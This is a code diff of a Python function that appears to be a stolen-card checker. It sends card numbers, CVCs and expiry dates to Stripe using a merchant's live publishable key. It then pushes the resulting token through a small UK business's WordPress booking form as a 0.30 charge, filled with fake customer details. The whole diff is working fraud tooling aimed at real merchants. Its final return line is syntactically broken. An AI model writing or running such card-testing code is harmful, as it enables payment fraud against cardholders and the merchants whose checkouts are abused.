@@ -11,34 +11,6 @@ def Tele(ccx):
 	r = requests.session()
 
 	headers = {
-	    'authority': 'webpro-it.co.uk',
-	    'accept': '*/*',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://webpro-it.co.uk',
-	    'referer': 'https://webpro-it.co.uk/checkout/invoice',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
-	}
-	
-	data = {
-	    'amount': '1',
-	    'invoice_number': '1',
-	    'is_webinar': '',
-	}
-	
-	response = requests.post('https://webpro-it.co.uk/handle-payment-intent', headers=headers, data=data)
-	
-	pi = re.search(r'"client_secret":"(.*?)_secret_', response.text).group(1)
-	client_secret = response.json()['client_secret']
-	
-	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
@@ -54,13 +26,44 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][country]=TH&payment_method_data[billing_details][address][line1]=Street+27&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][email]=rodamuser08%40gmail.com&payment_method_data[billing_details][phone]=4303000850&payment_method_data[type]=card&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_year]={yy}&payment_method_data[card][exp_month]={mm}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[payment_user_agent]=stripe.js%2F4b16495512%3B+stripe-js-v3%2F4b16495512%3B+payment-element&payment_method_data[client_attribution_metadata][client_session_id]=NA&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=standard&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=merchant_specified&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51PGz0w1kvJf1dIf4pdlqcaWDriITzYeEUjvr9CXtDfYklV1MZnHVw6qsv8yKZncbbqodNRHv3T3jzkvFbqdRUf3300ptDG3gzB&client_secret={client_secret}'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F2531af6ecf%3B+stripe-js-v3%2F2531af6ecf%3B+card-element&key=pk_live_51IptajIBfeWZuJE2AqWgwMoDW9qJ6KV92UmIdF9m6JFXJRcBYCNLmRg8EM299D8yhxobs01h0RfvYB798Nj2aXzz00F75jRU3D'
+	
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	
+	pm = response.json()['id']
+	
+	headers = {
+	    'authority': 'www.firstembracebirthandbaby.co.uk',
+	    'accept': '*/*',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'origin': 'https://www.firstembracebirthandbaby.co.uk',
+	    'referer': 'https://www.firstembracebirthandbaby.co.uk/make-a-booking/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	params = {
+	    't': '1746791741718',
+	}
+	
+	data = {
+	    'data': f'__fluent_form_embded_post_id=1338&_fluentform_4_fluentformnonce=cc34e1d25c&_wp_http_referer=%2Fmake-a-booking%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&phone=%2B66817480671&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&input_radio_5=Baby%20Massage%20and%20Yoga%20Gift%20Voucher%20%20&names_1%5Bfirst_name%5D=&names_1%5Blast_name%5D=&input_text=&datetime=&names_2%5Bfirst_name%5D=Rodam&names_2%5Blast_name%5D=User&input_text_1=Bro&phone_1=%2B66817480671&description_2=N&description_3=N&input_radio_4=no&terms-n-condition=on&terms-n-condition_1=on&terms-n-condition_2=on&payment_method=stripe&custom_payment_component_a0xb5f_1=0.30&datetime_1=&__ff_all_applied_coupons=&__stripe_payment_method_id={pm}',
+	    'action': 'fluentform_submit',
+	    'form_id': '4',
+	}
 	
 	response = requests.post(
-	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
+	    'https://www.firstembracebirthandbaby.co.uk/wp-admin/admin-ajax.php',
+	    params=params,
 	    headers=headers,
 	    data=data,
 	)
 	
-	result = re.search(r'"status": "(.*?)"', response.text).group(1)
-	return (result)
+	return (response.)
